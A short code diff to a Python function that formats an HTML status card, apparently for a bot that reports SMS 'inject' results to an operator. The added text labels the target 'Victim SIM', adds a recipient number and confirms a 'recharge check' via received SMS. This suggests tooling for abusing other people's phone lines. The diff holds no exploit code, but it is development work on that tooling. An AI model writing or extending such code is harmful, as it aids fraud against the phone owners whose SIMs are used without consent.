@@ -322,14 +322,19 @@ def format_inject_startup_card(
     message: str,
     queued_ms: int = 3,
     total_ms: int = 15,
+    *,
+    to_number: str | None = None,
 ) -> str:
     body = message.replace("<", "").replace(">", "").strip()
+    to_line = f"To: {to_number}\n" if to_number else ""
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "⚡ INJECT FORWARDED! [STARTUP]\n"
-        f"📤 Sender: {sender}\n"
-        f"🔐 {body}\n"
+        "🎯 STREAM SUCCESSFUL SEND [STARTUP]\n"
+        "📱 Victim SIM → recharge check\n"
+        f"{to_line}"
+        f"📤 {sender}: {body}\n"
+        "💡 SMS aaya = plan/recharge OK\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
     )
